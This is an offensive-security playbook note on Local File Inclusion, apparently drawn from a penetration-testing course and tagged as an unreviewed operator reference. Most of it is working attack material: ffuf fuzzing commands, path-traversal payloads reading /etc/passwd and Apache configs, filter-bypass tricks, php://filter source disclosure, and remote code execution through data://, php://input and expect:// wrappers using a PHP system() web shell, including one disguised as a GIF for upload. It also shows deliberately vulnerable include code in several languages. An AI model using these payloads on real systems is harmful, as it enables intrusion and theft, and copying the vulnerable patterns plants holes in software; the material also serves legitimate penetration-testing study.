---
technique: "LFI"
family: "ssrf-xxe-file"
severity_hint: "critical"
tags: ["LFI", "Remote Code Execution", "JavaScript", "PHP", "File Upload"]
source: "_raw/Web attacks/Web Attacks/LFI.md"
source_sha256: "393dee83f6efa5b80ec7d5cb5ce40f231539fc67f02a1f1575c89f90b6930e6e"
curator_version: 2
review_status: imported-unreviewed
---

# LFI

> Family: **ssrf-xxe-file** · Severity hint: **critical** · Tags: LFI, Remote Code Execution, JavaScript, PHP, File Upload
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: curl, ffuf, python3.

## Quick index — payloads & commands in this note
- `$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'htt`
- `bash: $ ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PO`
- `bash: $ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:`
- `bash: $ ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../..`
- `$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf`
- `$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars`
- `if (isset($_GET['language'])) {`
- `if(req.query.language) {`
- `app.get("/about/:language", function(req, res) {`
- `<c:if test="${not empty param.language}">`
- `<c:import url= "<%= request.getParameter('language') %>"/>`
- `@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {`
- `@Html.Partial(HttpContext.Request.Query['language'])`
- `<!--#include file="<% HttpContext.Request.Query['language'] %>"-->`
- `php: $language = str_replace('../', '', $_GET['language']);`
- `if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {`
- `?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]`
- `$ echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n `
- `$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u `
- `php://filter/read=convert.base64-encode/resource=config`
- `$ echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d`
- `$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-enco`
- `$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_ur`
- `$ echo '<?php system($_GET["cmd"]); ?>' | base64`
- `$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc`
- `$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index`
- `$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect`
- `$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"`
- `$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif`
- `<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">`
- … +14 more (see body)

## Playbook (operator notes)

# LFI

- Tooling
    
    **Fuzzing Parameters**
    
    - In many cases, the page may have other exposed parameters that are
    not linked to any HTML forms, and hence normal users would never access
    or unintentionally cause harm through
    - This is why it may be important to fuzz for exposed parameters, as they tend not to be as secure as public ones
    
    ```
    $ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
    
    ...SNIP...
    
     :: Method           : GET
     :: URL              : http://<SERVER_IP>:<PORT>/index.php?FUZZ=value
     :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt
     :: Follow redirects : false
     :: Calibration      : false
     :: Timeout          : 10
     :: Threads          : 40
     :: Matcher          : Response status: 200,204,301,302,307,401,403
     :: Filter           : Response size: xxx
    ________________________________________________
    
    language                    [Status: xxx, Size: xxx, Words: xxx, Lines: xxx]
    ```
    
    - Once we identify an exposed parameter that isn't linked to any forms we tested, we can perform all of the LFI tests discussed in this module
    - Applies to most web vulnerabilities
    
    **Tip:** For a more precise scan, we can limit our scan to the most popular LFI parameters found on this [link](https://book.hacktricks.xyz/pentesting-web/file-inclusion#top-25-parameters).
    
    **LFI wordlists**
    
    - Manual testing more reliable and can find LFI vulnerabillities that may not be identified otherwise
    - However, in many cases, we may want to run a quick test on a
    parameter to see if it is vulnerable to any common LFI payload, which
    may save us time in web applications where we need to test for various
    vulnerabilities
    - There are a number of [LFI Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) we can use for this scan
    - A good wordlist is [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt), as it contains various bypasses and common files, so it makes it easy to run several tests at once
    - We can use this wordlist to fuzz the `?language=` parameter we have been testing throughout the module
    
    ```bash
    $ ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
    
    ...SNIP...
    
     :: Method           : GET
     :: URL              : http://<SERVER_IP>:<PORT>/index.php?FUZZ=key
     :: Wordlist         : FUZZ: /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt
     :: Follow redirects : false
     :: Calibration      : false
     :: Timeout          : 10
     :: Threads          : 40
     :: Matcher          : Response status: 200,204,301,302,307,401,403
     :: Filter           : Response size: xxx
    ________________________________________________
    
    ..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
    ../../../../../../../../../../../../etc/hosts [Status: 200, Size: 2461, Words: 636, Lines: 72]
    ...SNIP...
    ../../../../etc/passwd  [Status: 200, Size: 3661, Words: 645, Lines: 91]
    ../../../../../etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
    ../../../../../../etc/passwd&=%3C%3C%3C%3C [Status: 200, Size: 3661, Words: 645, Lines: 91]
    ..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 3661, Words: 645, Lines: 91]
    /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
    ```
    
    **Fuzzing Server Files**
    
    - In addition to fuzzing LFI payloads, there are different server
    files that may be helpful in our LFI exploitation, so it would be
    helpful to know where such files exist and whether we can read them
    - Such files include: `Server webroot path`, `server configurations file`, and `server logs`
    
    **Server Webroot**
    
    - We may need to know the full server webroot path to complete our exploitation in some cases
    - For example, if we wanted to locate a file we uploaded, but we cannot reach its `/uploads` directory through relative paths (e.g. `../../uploads`)
    - In such cases, we may need to figure out the server webroot path so
    that we can locate our uploaded files through absolute paths instead of
    relative paths
    - To do so, we can fuzz for the `index.php` file through common webroot paths, which we can find in this [wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or this [wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt)
    - Depending on our LFI situation, we may need to add a few back directories (e.g. `../../../../`), and then add our `index.php` afterwords
    - We may also use the same [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) wordlist we used earlier, as it also contains various payloads that may reveal the webroot
    - If this does not help us in identifying the webroot, then our best
    choice would be to read the server configurations, as they tend to
    contain the webroot and other important information
    
    ```bash
    $ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
    
    ...SNIP...
    
    : Method           : GET
     :: URL              : http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php
     :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt
     :: Follow redirects : false
     :: Calibration      : false
     :: Timeout          : 10
     :: Threads          : 40
     :: Matcher          : Response status: 200,204,301,302,307,401,403,405
     :: Filter           : Response size: 2287
    ________________________________________________
    
    /var/www/html/          [Status: 200, Size: 0, Words: 1, Lines: 1]
    ```
    
    **Server Logs/Configurations**
    
    - We may also use the [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) wordlist, as it contains many of the server logs and configuration paths we may be interested in
    - If we wanted a more precise scan, we can use this [wordlist for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux) or this [wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows), though they are not part of `seclists`
    
    ```bash
    $ ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
    
    ...SNIP...
    
     :: Method           : GET
     :: URL              : http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ
     :: Wordlist         : FUZZ: ./LFI-WordList-Linux
     :: Follow redirects : false
     :: Calibration      : false
     :: Timeout          : 10
     :: Threads          : 40
     :: Matcher          : Response status: 200,204,301,302,307,401,403,405
     :: Filter           : Response size: 2287
    ________________________________________________
    
    /etc/hosts              [Status: 200, Size: 2461, Words: 636, Lines: 72]
    /etc/hostname           [Status: 200, Size: 2300, Words: 634, Lines: 66]
    /etc/login.defs         [Status: 200, Size: 12837, Words: 2271, Lines: 406]
    /etc/fstab              [Status: 200, Size: 2324, Words: 639, Lines: 66]
    /etc/apache2/apache2.conf [Status: 200, Size: 9511, Words: 1575, Lines: 292]
    /etc/issue.net          [Status: 200, Size: 2306, Words: 636, Lines: 66]
    ...SNIP...
    /etc/apache2/mods-enabled/status.conf [Status: 200, Size: 3036, Words: 715, Lines: 94]
    /etc/apache2/mods-enabled/alias.conf [Status: 200, Size: 3130, Words: 748, Lines: 89]
    /etc/apache2/envvars    [Status: 200, Size: 4069, Words: 823, Lines: 112]
    /etc/adduser.conf       [Status: 200, Size: 5315, Words: 1035, Lines: 153]
    ```
    
    - As we can see, the scan returned over 60 results, many of which were not identified with the [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) wordlist, which shows us that a precise scan is important in certain cases
    - Now, we can try reading any of these files to see whether we can get their content
    - We will read (`/etc/apache2/apache2.conf`), as it is a known path for the apache server configuration
    
    ```
    $ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf
    
    ...SNIP...
            ServerAdmin webmaster@localhost
            DocumentRoot /var/www/html
    
            ErrorLog ${APACHE_LOG_DIR}/error.log
            CustomLog ${APACHE_LOG_DIR}/access.log combined
    ...SNIP...
    ```
    
    - We do get the default webroot path and the log path
    - However, in this case, the log path is using a global apache variable (`APACHE_LOG_DIR`), which are found in another file we saw above, which is (`/etc/apache2/envvars`), and we can read it to find the variable values
    
    ```
    $ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars
    
    ...SNIP...
    export APACHE_RUN_USER=www-data
    export APACHE_RUN_GROUP=www-data
    # temporary state file location. This might be changed to /run in Wheezy+1
    export APACHE_PID_FILE=/var/run/apache2$SUFFIX/apache2.pid
    export APACHE_RUN_DIR=/var/run/apache2$SUFFIX
    export APACHE_LOCK_DIR=/var/lock/apache2$SUFFIX
    # Only /var/log/apache2 is handled by /etc/logrotate.d/apache2.
    export APACHE_LOG_DIR=/var/log/apache2$SUFFIX
    ...SNIP...
    ```
    
    - As we can see, the (`APACHE_LOG_DIR`) variable is set to (`/var/log/apache2`), and the previous configuration told us that the log files are `/access.log` and `/error.log`
    
    **Note:** Of course, we can simply use a 
    wordlist to find the logs, as multiple wordlists we used in this 
    sections did show the log location. But this exercises shows us how we 
    can manually go through identified files, and then use the information 
    we find to further identify more files and important information. This 
    is quite similar to when we read different file sources in the `PHP filters` section,
     and such efforts may reveal previously unknown information about the 
    web application, which we can use to further exploit it.
    
    The most common LFI tools are [LFISuite](https://github.com/D35m0nd142/LFISuite), [LFiFreak](https://github.com/OsandaMalith/LFiFreak), and [liffy](https://github.com/mzfr/liffy).
     We can also search GitHub for various other LFI tools and scripts, but 
    in general, most tools perform the same tasks, with varying levels of 
    success and accuracy
    
- Introduction
    
    ## **Local File Inclusion (LFI)**
    
    - Most commonly found in templating engines
        - Displays a page that that shows the common static parts e.g `header`, `navigation bar`, and `footer`
        - Dynamically loads other content that changes between pages
        - Often used parameters like `/index.php?page=about`, where `index.php` sets static content (e.g. header/footer), and then only pulls the dynamic content specified in the parameter
            - In this case may be read from a file called `about.php`
        - We have control over the `about` portion of the request
            - May be possible to have the web application grab other files and display them on the page
    
    ## **Examples of Vulnerable Code**
    
    - Can occur in `PHP`, `NodeJS`, `Java`, `.Net`, and many others
        - Each of them has a slightly different approach to including local
        files, but they all share one common thing: loading a file from a
        specified path
    
    **PHP**
    
    - Use `include()` function to load a local or a remote file as we load a page
    
    If the `path` passed to the `include()` is taken from a user-controlled parameter, like a `GET` parameter, and `the code does not explicitly filter and sanitize the user input`, then the code becomes vulnerable to File Inclusion.
    
    **Example**
    
    ```
    if (isset($_GET['language'])) {
        include($_GET['language']);
    }
    ```
    
    - `language` parameter is directly passed to the `include()`
    - Any path we pass in the `language` parameter will be loaded on the page
    - There are also many other functions that do the same thing
        - `include_once()`, `require()`, `require_once()`, `file_get_contents()`
    
    **NodeJS**
    
    - NodeJS web servers may also load content based on an HTTP parameters
    
    **Example**
    
    ```
    if(req.query.language) {
        fs.readFile(path.join(__dirname, req.query.language), function (err, data){
            res.write(data);
        });
    }
    ```
    
    - Whatever parameter passed from the URL gets used by the `readfile` function
    - Then writes the file content in the HTTP response
    - Another example is the `render()` function in the `Express.js` framework
    
    **Example**
    
    ```
    app.get("/about/:language", function(req, res) {
        res.render(`/${req.params.language}/about.html`);
    });
    ```
    
    - Uses language parameter to determine which directory it should pull the `about.html` page from
    
    Unlike our earlier examples where GET parameters were specified after a (`?`) character in the URL, the above example takes the parameter from the URL path (e.g. `/about/en` or `/about/es`).
    
    **Java**
    
    ```
    <c:if test="${not empty param.language}">
        <jsp:include file="<%= request.getParameter('language') %>" />
    </c:if>
    ```
    
    - The `import` function may also be used to render a local file or a URL
    
    ```
    <c:import url= "<%= request.getParameter('language') %>"/>
    ```
    
    **.NET**
    
    - The `Response.WriteFile` function works very similarly to all of our earlier examples
    - The path may be retrieved from a GET parameter for dynamic content loading
    
    ```
    @if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
        <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %>
    }
    ```
    
    - `@Html.Partial()` function may also be used to render the specified file as part of the front-end template, similarly to what we saw earlier
    
    ```
    @Html.Partial(HttpContext.Request.Query['language'])
    ```
    
    - `include` function may be used to render local files or remote URLs, and may also execute the specified files as well
    
    ```
    <!--#include file="<% HttpContext.Request.Query['language'] %>"-->
    ```
    
    **Read vs Execute**
    
    - Some of the above functions only read the content of the specified files, while others also execute the specified files
    - Some of them allow specifying remote URLs, while others only work with files local to the back-end server
    
    
    
- Basic Bypasses
    
    ## **Non-Recursive Path Traversal Filters**
    
    - One of the most basic filters against LFI is a search and replace filter, where it simply deletes substrings of (`../`) to avoid path traversals
    
    ```php
    $language = str_replace('../', '', $_GET['language']);
    ```
    
    - The above code is supposed to prevent path traversal, and hence renders LFI useless
    - We see that all `../` substrings were removed, which resulted in a final path being `./languages/etc/passwd` insead of `./languages/../../../../etc/passwd`
    - However, this filter is very insecure, as it is not `recursively removing` the `../` substring, as it runs a single time on the input string and does not apply the filter on the output string
    - For example, if we use `....//` as our payload, then the filter would remove `../` and the output string would be `../`, which means we may still perform path traversal
    - `http://<SERVER_IP>:<PORT>/index.php?language=....//....//....//....//etc/passwd`
    - We may use `..././` or `....\/` and several other recursive LFI payloads
    - Furthermore, in some cases, escaping the forward slash character may also work to avoid path traversal filters (e.g. `....\/`), or adding extra forward slashes (e.g. `....////`)
    
    ## **Encoding**
    
    - Some web filters may prevent input filters that include certain LFI-related characters, like a dot `.` or a slash `/` used for path traversals
    - However, some of these filters may be bypassed by URL encoding ourinput, such that it would no longer include these bad characters, but would still be decoded back to our path traversal string once it reaches the vulnerable function
    - Core PHP filters on versions 5.3.4 and earlier were specifically vulnerable to this bypass, but even on newer versions we may find custom filters that may be bypassed through URL encoding
    
    
    
    **Note:** For this to work we must URL encode
     all characters, including the dots. Some URL encoders may not encode 
    dots as they are considered to be part of the URL scheme.
    
    - `<SERVER_IP>:<PORT>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64`
    
    
    
    - Furthermore, we may also use Burp Decoder to encode the encoded string once again to have a `double encoded` string, which may also bypass other types of filters
    
    **Approved Paths**
    
    - Some web applications may also use Regular Expressions to ensure that the file being included is under a specific path
    - For example, the web application we have been dealing with may only accept paths that are under the `./languages` directory
    
    ```
    if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
        include($_GET['language']);
    } else {
        echo 'Illegal path specified!';
    }
    ```
    
    - To find the approved path, we can examine the requests sent by the
    existing forms, and see what path they use for the normal web
    functionality
    - Furthermore, we can fuzz web directories under the same path, and try different ones until we get a match
    - To bypass this, we may use path traversal and start our payload with the approved path, and then use `../` to go back to the root directory and read the file we specify
    - `<SERVER_IP>:<PORT>/index.php?language=./languages/../../../../etc/passwd`
    
    .png)
    
    - Some web applications may apply this filter along with one of the
    earlier filters, so we may combine both techniques by starting our
    payload with the approved path, and then URL encode our payload or use
    recursive payload
    
    **Appended Extension**
    
    - Some web applications append an extension to our input string (e.g. `.php`), to ensure that the file we include is in the expected extension
    - With modern versions of PHP, we may not be able to bypass this and
    will be restricted to only reading files in that extension, which may
    still be useful, as we will see in the next section (e.g. for reading
    source code)
    - There are a couple of other techniques we may use, but they are `obsolete with modern versions of PHP and only work with PHP versions before 5.3/5.4`
    - However, it may still be beneficial to mention them, as some web
    applications may still be running on older servers, and these techniques may be the only bypasses possible
    
    **Path Truncation**
    
    - In earlier versions of PHP, defined strings have a maximum length of 4096 characters, likely due to the limitation of 32-bit systems
    - If a longer string is passed, it will simply be `truncated`, and any characters after the maximum length will be ignored
    - Furthermore, PHP also used to remove trailing slashes and single dots in path names, so if we call (`/etc/passwd/.`) then the `/.` would also be truncated, and PHP would call (`/etc/passwd`)
    - PHP, and Linux systems in general, also disregard multiple slashes in the path (e.g. `////etc/passwd` is the same as `/etc/passwd`)
    - Similarly, a current directory shortcut (`.`) in the middle of the path would also be disregarded (e.g. `/etc/./passwd`)
    - If we combine both of these PHP limitations together, we can create very long strings that evaluate to a correct path
    - Whenever we reach the 4096 character limitation, the appended extension (`.php`) would be truncated, and we would have a path without an appended extension
    - Finally, it is also important to note that we would also need to `start the path with a non-existing directory` for this technique to work
    
    ```
    ?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
    ```
    
    - Of course, we don't have to manually type `./` 2048 times (total of 4096 characters), but we can automate the creation of this string with the following command
    
    ```
    $ echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
    non_existing_directory/../../../etc/passwd/./././<SNIP>././././
    ```
    
    - We may also increase the count of `../`, as adding more would still land us in the root directory, as explained in the previous section
    - However, if we use this method, we should calculate the full length of the string to ensure only `.php` gets truncated and not our requested file at the end of the string (`/etc/passwd`)
    
    **Null Bytes**
    
    - PHP versions before 5.5 were vulnerable to `null byte injection`, which means that adding a null byte (`%00`) at the end of the string would terminate the string and not consider anything after it
    - This is due to how strings are stored in low-level memory, where
    strings in memory must use a null byte to indicate the end of the
    string, as seen in Assembly, C, or C++ languages
    - To exploit this vulnerability, we can end our payload with a null byte (e.g. `/etc/passwd%00`), such that the final path passed to `include()` would be (`/etc/passwd%00.php`)
    - This way, even though `.php` is appended to our string, anything after the null byte would be truncated, and so the path used would actually be `/etc/passwd`, leading us to bypass the appended extension
- Second Order Attacks
    - Another common, and a little bit more advanced, LFI attack is a `Second Order Attack`
    - This occurs because many web application functionalities may be insecurely pulling files from the back-end server based on user-controlled parameters
    - For example, a web application may allow us to download our avatar through a URL like (`/profile/$username/avatar.png`)
    - If we craft a malicious LFI username (e.g. `../../../etc/passwd`), then it may be possible to change the file being pulled to another local file on the server and grab it instead of our avatar
    - In this case, we would be poisoning a database entry with a malicious LFI payload in our username
    - Then, another web application functionality would utilize this poisoned entry to perform our attack (i.e. download our avatar based on username value)
- PHP Filters
    
    ## **Input Filters**
    
    - [PHP Filters](https://www.php.net/manual/en/filters.php) are a type of PHP wrappers, where we can pass different types of input and have it filtered by the filter we specify
    - To use PHP wrapper streams, we can use the `php://` scheme in our string, and we can access the PHP filter wrapper with `php://filter/`
    - The `filter` wrapper has several parameters, but the main ones we require for our attack are `resource` and `read`
    - The `resource` parameter is required for filter wrappers, and with it we can specify the stream we would like to apply the filter on (e.g. a local file), while the `read` parameter can apply different filters on the input resource, so we can use it to specify
    which filter we want to apply on our resource
    - There are four different types of filters available for use, which are [String Filters](https://www.php.net/manual/en/filters.string.php), [Conversion Filters](https://www.php.net/manual/en/filters.convert.php), [Compression Filters](https://www.php.net/manual/en/filters.compression.php), and [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
    - The filter that is useful for LFI attacks is the `convert.base64-encode` filter, under `Conversion Filters`
    
    ## **Fuzzing for PHP Files**
    
    ```
    $ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
    
    ...SNIP...
    
    index                   [Status: 200, Size: 2652, Words: 690, Lines: 64]
    config                  [Status: 302, Size: 0, Words: 1, Lines: 1]
    
    ```
    
    **Tip:** Unlike normal web application usage, we are not restricted to pages with HTTP response code 200, as we have  local file inclusion access, so we should be scanning for all codes, including `301`, `302` and `403` pages, and we should be able to read their source code as well.
    
    ## **Standard PHP Inclusion**
    
    - If you tried to include any php files through LFI, you would have noticed that the included PHP file gets executed, and eventually gets rendered as a normal HTML page
    - `http://<SERVER_IP>:<PORT>/index.php?language=config.php`
    - As we can see, we get an empty result in place of our LFI string, since the `config.php` most likely only sets up the web app configuration and does not render any HTML output
    - This may be useful in certain cases, like accessing local PHP pages we do not have access over (i.e. SSRF), but in most cases, we would be more interested in reading the PHP source code through LFI, as source codes tend to reveal important information about the web application
    - This is where the `base64` php filter gets useful, as we
    can use it to base64 encode the php file, and then we would get the encoded source code instead of having it being executed and rendered
    - This is especially useful for cases where we are dealing with LFI with appended PHP extensions, because we may be restricted to including
    PHP files only, as discussed in the previous section
    
    **Note:** The same applies to web application languages other than PHP, as long as the vulnerable function can execute files. Otherwise, we would directly get the source code, and 
    would not need to use extra filters/functions to read the source code. Refer to the functions table in section 1 to see which functions have which privileges.
    
    ## **Source Code Disclosure**
    
    - Once we have a list of potential PHP files we want to read, we can start disclosing their sources with the `base64` PHP filter
    
    ```
    php://filter/read=convert.base64-encode/resource=config
    ```
    
    - `http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config`
    
    **Note:** We intentionally left the resource file at the end of our string, as the `.php` extension is automatically appended to the end of our input string, which would make the resource we specified be `config.php`.
    
    - We can now decode this string to get the content of the source code of `config.php`
    
    ```
    $ echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
    
    ...SNIP...
    
    if ($_SERVER['REQUEST_METHOD'] == 'GET' && realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])) {
      header('HTTP/1.0 403 Forbidden', TRUE, 403);
      die(header('location: /index.php'));
    }
    
    ...SNIP...
    ```
    
    **Tip:** When copying the base64 encoded string, be sure to copy the entire string or it will not fully decode.  You can view the page source to ensure you copy the entire string.
    
- PHP Wrapper
    - The [data](https://www.php.net/manual/en/wrappers.data.php) wrapper can be used to include external data, including PHP code
    - However, the data wrapper is only available to use if the (`allow_url_include`) setting is enabled in the PHP configurations
    - So, let's first confirm whether this setting is enabled, by reading the PHP configuration file through the LFI vulnerability
    
    **Checking PHP Configurations**
    
    - File is found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where `X.Y` is your install PHP version
    - We can start with the latest PHP version, and try earlier versions if we couldn't locate the configuration file
    - We will also use the `base64` filter we used in the previous section, as `.ini` files are similar to `.php` files and should be encoded to avoid breaking
    - Finally, we'll use cURL or Burp instead of a browser, as the output
    string could be very long and we should be able to properly capture it
    
    ```
    $ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"<!DOCTYPE html>
    
    <html lang="en">
    ...SNIP...
     <h2>Containers</h2>
        W1BIUF0KCjs7Ozs7Ozs7O
        ...SNIP...
        4KO2ZmaS5wcmVsb2FkPQo=
    <p class="read-more">
    ```
    
    ```
    $ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
    
    allow_url_include = On
    ```
    
    - `This option is not enabled by default`, and is required for several other LFI attacks, like using the `input` wrapper or for any RFI attack
    - It is `not uncommon to see this option enabled`, as many web applications rely on it to function properly, like some WordPress plugins and themes, for example
    
    **Remote Code Execution**
    
    - With `allow_url_include` enabled, we can proceed with our `data` wrapper attack
    - As mentioned earlier, the `data` wrapper can be used to include external data, including PHP code
    - We can also pass it `base64` encoded strings with `text/plain;base64`, and it has the ability to decode them and execute the PHP code
    
    ```
    $ echo '<?php system($_GET["cmd"]); ?>' | base64
    
    PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg=
    ```
    
    - `http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGV<SNIP>&cmd=id`
    
    
    
    - We can also use cURL
    
    ```
    $ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzd<SNIP>&cmd=id' | grep uid
                uid=33(www-data) gid=33(www-data) groups=33(www-data)
    ```
    
    **Input**
    
    - The [input](https://www.php.net/manual/en/wrappers.php.php) wrapper can be used to include external input and execute PHP code
    - The difference between it and the `data` wrapper is that we pass our input to the `input` wrapper as a POST request's data
    - So, the vulnerable parameter must accept POST requests for this attack to work
    - `Input` wrapper also depends on the `allow_url_include` setting
    
    ```
    $ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
                uid=33(www-data) gid=33(www-data) groups=33(www-data)
    ```
    
    **Note:** To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use `$_REQUEST`). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. `<\?php system('id')?>`)
    
    **Expect**
    
    - We may utilize the [expect](https://www.php.net/manual/en/wrappers.expect.php) wrapper, which allows us to directly run commands through URL streams
    - We don't need to provide a web shell, as it is designed to execute commands
    - Expect is an external wrapper, so it needs to be manually installed
    and enabled on the back-end server, though some web apps rely on it for
    their core functionality, so we may find it in specific cases
    
    ```
    $ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
    extension=expect
    ```
    
    - We can use the `expect://` wrapper and then pass the command we want to execute
    
    ```
    $ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    ```
    
- LFI via Fileupload
    
    File upload functionalities are ubiquitous in most modern web applications, as users usually need to configure their profile and usage of the web application by uploading their data. For attackers, the ability to store files on the back-end server may extend the exploitation of many vulnerabilities, like a file inclusion vulnerability. 
    
    If the vulnerable function has code `Execute` capabilities, then the code within the file we upload will get executed if we include it, regardless of the file extension or file type. For example, we can upload an image file (e.g. `image.jpg`), and store a PHP web shell code within it 'instead of image data', and if we include it through the LFI vulnerability, the PHP code will get executed and we will have remote code execution.
    
    ## **Image upload**
    
    - Very common in most modern web applications, as uploading images is widely regarded as safe if the upload function is securely coded
    - The vulnerability, in this case, is not in the file upload form but the file inclusion functionality
    
    **Crafting Malicious Image**
    
    - Our first step is to create a malicious image containing a PHP web shell code that still looks and works as an image
    - So, we will use an allowed image extension in our file name (e.g. `shell.gif`), and should also include the image magic bytes at the beginning of the file content (e.g. `GIF8`), just in case the upload form checks for both the extension and content type as well
    
    ```
    $ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
    ```
    
    - This file on its own is completely harmless and would not affect normal web applications in the slightest
    - However, if we combine it with an LFI vulnerability, then we may be able to reach remote code execution
    
    **Note:** We are using a `GIF` image in this case since its magic bytes are easily typed, as they are ASCII characters, while other extensions have magic bytes in binary that we would need to URL encode. However, this attack would work with any allowed image or file type.
    
    **Uploaded File Path**
    
    - Once we've uploaded our file, all we need to do is include it through the LFI vulnerability
    - To include the uploaded file, we need to know the path to our uploaded file
    - In most cases, especially with images, we would get access to our uploaded file and can get its path from its URL
    - In our case, if we inspect the source code after uploading the image, we can get its URL
    
    ```
    <img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
    ```
    
    **Note:** As we can see, we can use `/profile_images/shell.gif` for the file path. If we do not know where the file is uploaded, then we can fuzz for an uploads directory, and then fuzz for our uploaded file, though this may not always work as some web applications properly 
    hide the uploaded files.
    
